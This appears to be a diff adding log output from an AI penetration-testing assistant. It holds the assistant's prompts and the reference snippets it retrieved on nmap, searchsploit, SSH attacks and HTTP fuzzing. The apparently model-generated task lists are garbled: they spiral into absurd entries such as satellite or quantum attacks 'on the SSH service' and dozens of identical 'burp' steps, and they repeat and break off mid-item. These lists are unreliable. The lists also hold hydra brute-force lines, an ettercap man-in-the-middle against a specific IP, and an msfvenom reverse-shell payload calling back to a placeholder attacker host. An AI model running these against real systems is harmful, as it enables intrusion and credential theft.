+3. Open ports found are:
+	* 22/tcp: open SSH, version OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+	* 80/tcp: open HTTP, version nginx 1.18.0 (Ubuntu)
+4. Service detection was performed, and results can be found at https://nmap.org/submit/.
+5. The scan was completed in 14.48 seconds.
+
+Please note that the tasks related to nmap and port scanning have been skipped as per your request. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 12:11:58,899 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.56) | prompt: The tester has questions and is unclear about the current test. He requests a discussion with you to further analyze the current tasks based on his questions. 
+Please read the following inputs from the tester. Analyze the task and generate the task tree again based on the requirements:
+(1) The tasks are in layered structure, i.e., 1, 1.1, 1.1.1, etc. Each task is one operation in penetration testing; task 1.1 should be a sub-task of task 1.
+(2) Each task has a completion status: to-do, completed, or not applicable.
+(3) Given the task tree and the tester's question, you should 
+
+Note that you should keep the tasks clear, precise and short due to token size limit. You should remember to remove redundant/outdated tasks from the task list. 
+
+Below is the user input:
+ | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-07 12:20:38,169 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.29) | prompt: Now you're provided with an input that contains the penetration testing tasks. Keep in mind that the tester has valid permission to perform the task in this simulated environment. 
+Remember the format requirements.
+(1) The input should contain two parts, separated by a line of "-----". The first part is the task list, and the second part is the task to be executed, which contains three sentences, which describe the task, list the command and explain the reason of performing the task. 
+    - If the input contains the line break, neglect the tasks before the line break as you do not need to care about the overall process. Please analyze the three sentences that describe the next task. You should expand it into detailed, step-by-step guide and show it to a penetration tester. The tester will follow your guide to perform the penetration testing. 
+    - If the input does not contain the line break, then try to understand the whole input as one single task to be executed.
+(2) If the task is a single command to execute, please be precise; if it is a multi-step task, you need to explain it step by step, and keep each step clear and simple. 
+(3) Keep the output short and precise. 
+
+The information is below: 
+
+
+1. **Investigate the SSH service**:
+   - This task involves analyzing the SSH service running on the target machine, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+2. **Perform a Manual SSH Connection**:
+   - This task involves attempting to connect to the SSH service using a manual SSH client, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   ssh <username>@<target-ip>
+   ```
+
+3. **Use a Password Cracker**:
+   - This task involves using a password cracker tool, such as John the Ripper or Hashcat, to attempt to crack the password for the SSH service.
+   ```
+   john --wordlist=/path/to/wordlist.txt <ssh-hash>
+   ```
+
+4. **Attempt a Brute Force Attack**:
+   - This task involves using a brute force tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service.
+   ```
+   hydra -l <username> -P /path/to/wordlist.txt ssh://<target-ip>
+   ```
+
+5. **Exploit Known Vulnerabilities**:
+   - This task involves using a tool, such as Metasploit or Exploit-DB, to search for known vulnerabilities in the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+6. **Perform a Man-in-the-Middle Attack**:
+   - This task involves using a tool, such as Ettercap or SSLstrip, to intercept and modify the SSH traffic between the target machine and another machine, potentially allowing the attacker to capture login credentials or other sensitive information.
+   ```
+   ettercap -M arp:remote /10.129.228.212/
+   ```
+
+7. **Perform a Dictionary Attack**:
+   - This task involves using a tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service using a predefined dictionary of common passwords.
+   ```
+   hydra -L /path/to/username.txt -P /path/to/password.txt ssh://<target-ip>
+   ```
+
+8. **Use a Public Exploit Database**:
+   - This task involves using a tool, such as Exploit-DB or Metasploit, to search for public exploits that target the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+9. **Perform a Fuzzing Attack**:
+   - This task involves using a tool, such as Peach or Spike, to perform a fuzzing attack on the SSH service, potentially allowing the attacker to discover new vulnerabilities or exploit existing ones.
+   ```
+   peach -f <fuzzing-script> -d <ssh-service>
+   ```
+
+10. **Perform a Reverse Engineering Attack**:
+   - This task involves using a tool, such as IDA Pro or Ghidra, to reverse engineer the SSH service and potentially discover new vulnerabilities or exploit existing ones.
+   ```
+   idaq -a <ssh-service>
+   ```
+
+11. **Perform a Binary Exploitation Attack**:
+   - This task involves using a tool, such as Metasploit or GDB, to perform a binary exploitation attack on the SSH service, potentially allowing the attacker to execute arbitrary code on the target machine.
+   ```
+   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > ssh_exploit.exe
+   ```
+
+12. **Perform a Web Application Attack**:
+   - This task involves using a tool, such as Burp Suite or ZAP, to perform a web application attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the web interface or other related components.
+   ```
+   burp
+   ```
+
+13. **Perform a Database Attack**:
+   - This task involves using a tool, such as SQLmap or Mongo-Express, to perform a database attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the database or other related components.
+   ```
+   sqlmap -u "http://<target-ip>:<port>/<path>"
+   ```
+
+14. **Perform a Network Attack**:
+   - This task involves using a tool, such as Wireshark or tcpdump, to perform a network attack on the SSH service, potentially allowing the attacker to capture sensitive information or exploit weaknesses in the network infrastructure.
+   ```
+   tcpdump -i <interface> -s 0 -w ssh_capture.pcap
+   ```
+
+15. **Perform a Cryptographic Attack**:
+   - This task involves using a tool, such as Cryptool or Hashcat, to perform a cryptographic attack on the SSH service, potentially allowing the attacker to decrypt sensitive information or exploit weaknesses in the cryptographic algorithms or implementations.
+   ```
+   hashcat -m 0 -a 0 <ssh-hash> /path/to/wordlist.txt
+   ```
+
+16. **Perform a Social Engineering Attack**:
+   - This task involves using a tool, such as Social-Engineer Toolkit or BeEF, to perform a social engineering attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the human factor or other related components.
+   ```
+   setoolkit
+   ```
+
+17. **Perform a Physical Security Attack**:
+   - This task involves using a tool, such as Hak5 Bash Bunny or Proxmark3, to perform a physical security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the physical security infrastructure or other related components.
+   ```
+   bashbunny
+   ```
+
+18. **Perform a Cloud Security Attack**:
+   - This task involves using a tool, such as AWS CLI or Azure CLI, to perform a cloud security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the cloud security infrastructure or other related components.
+   ```
+   aws s3 ls
+   ```
+
+19. **Perform a Mobile Security Attack**:
+   - This task involves using a tool, such as Frida or Mobexler, to perform a mobile security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the mobile security infrastructure or other related components.
+   ```
+   frida-server --no-pause
+   ```
+
+20. **Perform an Internet of Things (IoT) Security Attack**:
+   - This task involves using a tool, such as Shodan or Censys, to perform an IoT security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the IoT security infrastructure or other related components.
+   ```
+   shodan scan <target-ip>
+   ```
+
+21. **Perform a Industrial Control Systems (ICS) Security Attack**:
+   - This task involves using a tool, such as Modbus Toolkit or S7-Exploiter, to perform an ICS security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the ICS security infrastructure or other related components.
+   ```
+   modbus-toolkit
+   ```
+
+22. **Perform a Supervisory Control and Data Acquisition (SCADA) Security Attack**:
+   - This task involves using a tool, such as ScadaBrk or DNP3-Exploiter, to perform a SCADA security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the SCADA security infrastructure or other related components.
+   ```
+   scadabrk
+   ```
+
+23. **Perform a Radio Frequency (RF) Security Attack**:
+   - This task involves using a tool, such as GQRX or Inspectrum, to perform a RF security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the RF security infrastructure or other related components.
+   ```
+   gqrx
+   ```
+
+24. **Perform a Satellite Security Attack**:
+   - This task involves using a tool, such as GNURadio or Satellite Tracker, to perform a satellite security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the satellite security infrastructure or other related components.
+   ```
+   gnuradio-companion
+   ```
+
+25. **Perform a Quantum Cryptography Security Attack**:
+   - This task involves1. **Investigate the SSH service**:
+   - This task involves analyzing the SSH service running on the target machine, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+2. **Perform a Manual SSH Connection**:
+   - This task involves attempting to connect to the SSH service using a manual SSH client, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   ssh <username>@<target-ip>
+   ```
+
+3. **Use a Password Cracker**:
+   - This task involves using a password cracker tool, such as John the Ripper or Hashcat, to attempt to crack the password for the SSH service.
+   ```
+   john --wordlist=/path/to/wordlist.txt <ssh-hash>
+   ```
+
+4. **Attempt a Brute Force Attack**:
+   - This task involves using a brute force tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service.
+   ```
+   hydra -l <username> -P /path/to/wordlist.txt ssh://<target-ip>
+   ```
+
+5. **Exploit Known Vulnerabilities**:
+   - This task involves using a tool, such as Metasploit or Exploit-DB, to search for known vulnerabilities in the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+6. **Perform a Man-in-the-Middle Attack**:
+   - This task involves using a tool, such as Ettercap or SSLstrip, to intercept and modify the SSH traffic between the target machine and another machine, potentially allowing the attacker to capture login credentials or other sensitive information.
+   ```
+   ettercap -M arp:remote /10.129.228.212/
+   ```
+
+7. **Perform a Dictionary Attack**:
+   - This task involves using a tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service using a predefined dictionary of common passwords.
+   ```
+   hydra -L /path/to/username.txt -P /path/to/password.txt ssh://<target-ip>
+   ```
+
+8. **Use a Public Exploit Database**:
+   - This task involves using a tool, such as Exploit-DB or Metasploit, to search for public exploits that target the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+9. **Perform a Fuzzing Attack**:
+   - This task involves using a tool, such as Peach or Spike, to perform a fuzzing attack on the SSH service, potentially allowing the attacker to discover new vulnerabilities or exploit existing ones.
+   ```
+   peach -f <fuzzing-script> -d <ssh-service>
+   ```
+
+10. **Perform a Reverse Engineering Attack**:
+   - This task involves using a tool, such as IDA Pro or Ghidra, to reverse engineer the SSH service and potentially discover new vulnerabilities or exploit existing ones.
+   ```
+   idaq -a <ssh-service>
+   ```
+
+11. **Perform a Binary Exploitation Attack**:
+   - This task involves using a tool, such as Metasploit or GDB, to perform a binary exploitation attack on the SSH service, potentially allowing the attacker to execute arbitrary code on the target machine.
+   ```
+   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > ssh_exploit.exe
+   ```
+
+12. **Perform a Web Application Attack**:
+   - This task involves using a tool, such as Burp Suite or ZAP, to perform a web application attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the web interface or other related components.
+   ```
+   burp
+   ```
+
+13. **Perform a Database Attack**:
+   - This task involves using a tool, such as SQLmap or Mongo-Express, to perform a database attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the database or other related components.
+   ```
+   sqlmap -u "http://<target-ip>:<port>/<path>"
+   ```
+
+14. **Perform a Network Attack**:
+   - This task involves using a tool, such as Wireshark or tcpdump, to perform a network attack on the SSH service, potentially allowing the attacker to capture sensitive information or exploit weaknesses in the network infrastructure.
+   ```
+   tcpdump -i <interface> -s 0 -w ssh_capture.pcap
+   ```
+
+15. **Perform a Cryptographic Attack**:
+   - This task involves using a tool, such as Cryptool or Hashcat, to perform a cryptographic attack on the SSH service, potentially allowing the attacker to decrypt sensitive information or exploit weaknesses in the cryptographic algorithms or implementations.
+   ```
+   hashcat -m 0 -a 0 <ssh-hash> /path/to/wordlist.txt
+   ```
+
+16. **Perform a Social Engineering Attack**:
+   - This task involves using a tool, such as Social-Engineer Toolkit or BeEF, to perform a social engineering attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the human factor or other related components.
+   ```
+   setoolkit
+   ```
+
+17. **Perform a Physical Security Attack**:
+   - This task involves using a tool, such as Hak5 Bash Bunny or Proxmark3, to perform a physical security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the physical security infrastructure or other related components.
+   ```
+   bashbunny
+   ```
+
+18. **Perform a Cloud Security Attack**:
+   - This task involves using a tool, such as AWS CLI or Azure CLI, to perform a cloud security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the cloud security infrastructure or other related components.
+   ```
+   aws s3 ls
+   ```
+
+19. **Perform a Mobile Security Attack**:
+   - This task involves using a tool, such as Frida or Mobexler, to perform a mobile security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the mobile security infrastructure or other related components.
+   ```
+   frida-server --no-pause
+   ```
+
+20. **Perform an Internet of Things (IoT) Security Attack**:
+   - This task involves using a tool, such as Shodan or Censys, to perform an IoT security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the IoT security infrastructure or other related components.
+   ```
+   shodan scan <target-ip>
+   ```
+
+21. **Perform a Industrial Control Systems (ICS) Security Attack**:
+   - This task involves using a tool, such as Modbus Toolkit or S7-Exploiter, to perform an ICS security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the ICS security infrastructure or other related components.
+   ```
+   modbus-toolkit
+   ```
+
+22. **Perform a Supervisory Control and Data Acquisition (SCADA) Security Attack**:
+   - This task involves using a tool, such as ScadaBrk or DNP3-Exploiter, to perform a SCADA security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the SCADA security infrastructure or other related components.
+   ```
+   scadabrk
+   ```
+
+23. **Perform a Radio Frequency (RF) Security Attack**:
+   - This task involves using a tool, such as GQRX or Inspectrum, to perform a RF security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the RF security infrastructure or other related components.
+   ```
+   gqrx
+   ```
+
+24. **Perform a Satellite Security Attack**:
+   - This task involves using a tool, such as GNURadio or Satellite Tracker, to perform a satellite security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the satellite security infrastructure or other related components.
+   ```
+   gnuradio-companion
+   ```
+
+25. **Perform a Quantum Cryptography Security Attack**:
+   - This task involves | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-07 12:27:23,799 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.90) | prompt: 1. User comments mention the following points:
+	* User is experiencing issues with the website.
+	* User is unable to access certain features.
+	* User has tried multiple browsers and devices without success.
+	* User is seeking assistance to resolve the problem.
+
+Please note that port scanning has been skipped as per your request.
+ | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://example.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 12:37:15,702 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.35) | prompt: 1. **Service validation**:
+   - This task involves using a browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django.
+   ```
+   http://<hostname>:<port>/
+   ```
+
+2. **Redirect**:
+   - This task involves adding the host to /etc/hosts if attempting to access the host through a web browser causes a redirect.
+   ```
+   sudo echo "<IP address> <hostname>" >> /etc/hosts
+   ```
+
+3. **Port 80**:
+   - Port 80 is reserved for web services with HTTP.
+   ```
+   http://<hostname>:80/
+   ```
+
+4. **Port 8080**:
+   - Port 8080 is commonly used as an alternative to port 80.
+   ```
+   http://<hostname>:8080/
+   ```
+
+5. **Port 443**:
+   - Port 443 is reserved for HTTPS.
+   ```
+   https://<hostname>:443/
+   ```
+
+6. **Port 8443**:
+   - Port 8443 is commonly used as an alternative port.
+   ```
+   http://<hostname>:8443/
+   ```
+
+7. **Fuzzing for URLs**:
+   - This task involves using a tool, such as OWASP DirBuster, to perform URL fuzzing by providing a target URL and a wordlist.
+   ```
+   dirbuster.sh -u http://<hostname>:<port>/ -w /usr/share/wordlists/megabeast.txt
+   ```
+
+8. **Fuzzing for sub-directories**:
+   - This task involves using a tool, such as Gobuster, to perform sub-directory fuzzing by providing a URL and a wordlist.
+   ```
+   gobuster dir -u http://<hostname>:<port>/ -w /usr/share/wordlists/subdomains-top1million-110000.txt
+   ```
+
+9. **Fuzzing for sub-domains**:
+   - This task involves using a tool, such as Gobuster, to perform sub-domain fuzzing by providing a domain and a wordlist.
+   ```
+   gobuster dns -d <domain> -w /usr/share/wordlists/subdomains-top1million-110000.txt
+   ```
+
+10. **Intercept network traffic with Burp Suite CE**:
+   - This task involves using Burp Suite CE to intercept the network traffic between the host and a client browser, allowing for manual vulnerability scanning for HTTP connections.
+   ```
+   burp
+   ```
+
+11. **Perform a Manual Vulnerability Scan with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a manual vulnernerability scan on the HTTP connections, allowing for the discovery of potential vulnerabilities.
+   ```
+   burp
+   ```
+
+12. **Perform a Passive Vulnerability Scan with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a passive vulnerability scan on the HTTP connections, allowing for the discovery of potential vulnerabilities without actively sending requests.
+   ```
+   burp
+   ```
+
+13. **Perform a Web Application Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a comprehensive web application security assessment on the HTTP connections, allowing for the discovery of potential vulnerabilities, misconfigurations, and other security issues.
+   ```
+   burp
+   ```
+
+14. **Perform a Browser-based Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a browser-based security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the browser's behavior or configuration.
+   ```
+   burp
+   ```
+
+15. **Perform a Mobile Application Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a mobile application security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the mobile application's behavior or configuration.
+   ```
+   burp
+   ```
+
+16. **Perform a Network Infrastructure Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a network infrastructure security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the network infrastructure or configuration.
+   ```
+   burp
+   ```
+
+17. **Perform a Cloud Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a cloud security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the cloud environment or configuration.
+   ```
+   burp
+   ```
+
+18. **Perform a Physical Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a physical security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the physical security environment or configuration.
+   ```
+   burp
+   ```
+
+19. **Perform a Social Engineering Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a social engineering assessment on the HTTP connections, allowing for the discovery of potential security issues related to the social engineering environment or configuration.
+   ```
+   burp
+   ```
+
+20. **Perform a Quantum Cryptography Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a quantum cryptography security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the quantum cryptography environment or configuration.
+   ```
+   burp
+   ```
+
+21. **Perform a Black Box Testing Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a black box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the black box testing environment or configuration.
+   ```
+   burp
+   ```
+
+22. **Perform a White Box Testing Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a white box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the white box testing environment or configuration.
+   ```
+   burp
+   ```
+
+23. **Perform a Gray Box Testing Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a gray box testing assessment on the HTTP connections, allowing for the discovery of potential security issues related to the gray box testing environment or configuration.
+   ```
+   burp
+   ```
+
+24. **Perform a Security Audit with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security audit on the HTTP connections, allowing for the discovery of potential security issues related to the security audit environment or configuration.
+   ```
+   burp
+   ```
+
+25. **Perform a Security Penetration Testing with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security penetration testing on the HTTP connections, allowing for the discovery of potential security issues related to the security penetration testing environment or configuration.
+   ```
+   burp
+   ```
+
+26. **Perform a Security Vulnerability Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security vulnerability assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security vulnerability assessment environment or configuration.
+   ```
+   burp
+   ```
+
+27. **Perform a Security Web Application Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security web application assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security web application assessment environment or configuration.
+   ```
+   burp
+   ```
+
+28. **Perform a Security Web Services Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security web services assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security web services assessment environment or configuration.
+   ```
+   burp
+   ```
+
+29. **Perform a Security Mobile Application Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security mobile application assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security mobile application assessment environment or configuration.
+   ```
+   burp
+   ```
+
+30. **Perform a Security Network Infrastructure Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a security network infrastructure assessment on the HTTP connections, allowing for the discovery of potential security issues related to the security network infrastructure assessment environment or configuration.
+   ```
+   burp
+  1. **Service validation**:
+   - This task involves using a browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django.
+   ```
+   http://<hostname>:<port>/
+   ```
+
+2. **Redirect**:
+   - This task involves adding the host to /etc/hosts if attempting to access the host through a web browser causes a redirect.
+   ```
+   sudo echo "<IP address> <hostname>" >> /etc/hosts
+   ```
+
+3. **Port 80**:
+   - Port 80 is reserved for web services with HTTP.
+   ```
+   http://<hostname>:80/
+   ```
+
+4. **Port 8080**:
+   - Port 8080 is commonly used as an alternative to port 80.
+   ```
+   http://<hostname>:8080/
+   ```
+
+5. **Port 443**:
+   - Port 443 is reserved for HTTPS.
+   ```
+   https://<hostname>:443/
+   ```
+
+6. **Port 8443**:
+   - Port 8443 is commonly used as an alternative port.
+   ```
+   http://<hostname>:8443/
+   ```
+
+7. **Fuzzing for URLs**:
+   - This task involves using a tool, such as OWASP DirBuster, to perform URL fuzzing by providing a target URL and a wordlist.
+   ```
+   dirbuster.sh -u http://<hostname>:<port>/ -w /usr/share/wordlists/megabeast.txt
+   ```
+
+8. **Fuzzing for sub-directories**:
+   - This task involves using a tool, such as Gobuster, to perform sub-directory fuzzing by providing a URL and a wordlist.
+   ```
+   gobuster dir -u http://<hostname>:<port>/ -w /usr/share/wordlists/subdomains-top1million-110000.txt
+   ```
+
+9. **Fuzzing for sub-domains**:
+   - This task involves using a tool, such as Gobuster, to perform sub-domain fuzzing by providing a domain and a wordlist.
+   ```
+   gobuster dns -d <domain> -w /usr/share/wordlists/subdomains-top1million-110000.txt
+   ```
+
+10. **Intercept network traffic with Burp Suite CE**:
+   - This task involves using Burp Suite CE to intercept the network traffic between the host and a client browser, allowing for manual vulnerability scanning for HTTP connections.
+   ```
+   burp
+   ```
+
+11. **Perform a Manual Vulnerability Scan with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a manual vulnernerability scan on the HTTP connections, allowing for the discovery of potential vulnerabilities.
+   ```
+   burp
+   ```
+
+12. **Perform a Passive Vulnerability Scan with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a passive vulnerability scan on the HTTP connections, allowing for the discovery of potential vulnerabilities without actively sending requests.
+   ```
+   burp
+   ```
+
+13. **Perform a Web Application Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a comprehensive web application security assessment on the HTTP connections, allowing for the discovery of potential vulnerabilities, misconfigurations, and other security issues.
+   ```
+   burp
+   ```
+
+14. **Perform a Browser-based Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a browser-based security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the browser's behavior or configuration.
+   ```
+   burp
+   ```
+
+15. **Perform a Mobile Application Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a mobile application security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the mobile application's behavior or configuration.
+   ```
+   burp
+   ```
+
+16. **Perform a Network Infrastructure Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a network infrastructure security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the network infrastructure or configuration.
+   ```
+   burp
+   ```
+
+17. **Perform a Cloud Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a cloud security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the cloud environment or configuration.
+   ```
+   burp
+   ```
+
+18. **Perform a Physical Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a physical security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the physical security environment or configuration.
+   ```
+   burp
+   ```
+
+19. **Perform a Social Engineering Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a social engineering assessment on the HTTP connections, allowing for the discovery of potential security issues related to the social engineering environment or configuration.
+   ```
+   burp
+   ```
+
+20. **Perform a Quantum Cryptography Security Assessment with Burp Suite CE**:
+   - This task involves using Burp Suite CE to perform a quantum cryptography security assessment on the HTTP connections, allowing for the discovery of potential security issues related to the quantum cryptography environment or configuration.
+   ```
+   burp
+   ```
+
+21. **Perform a Black Box Testing Assessment with Burp Suite CE**:
